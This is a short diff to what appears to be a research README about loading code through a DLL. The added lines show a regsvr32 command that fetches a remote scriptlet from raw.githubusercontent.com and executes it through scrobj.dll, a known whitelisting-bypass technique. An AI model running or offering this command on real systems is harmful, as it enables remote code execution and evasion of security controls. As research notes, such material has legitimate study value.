@@ -19,4 +19,9 @@ The DLL can be any dll you create with code in DLL_PROCESS_ATTACH
 
 This may be useful.  I don't know.  I think its interesting.
 
+For DynamicWrapperX example:
+
+C:\Windows\syswow64\regsvr32.exe 
+
+/s /u /i:https://raw.githubusercontent.com/subTee/RegistrationFreeCOM/master/dynamicwrapper.sct scrobj.dll
 
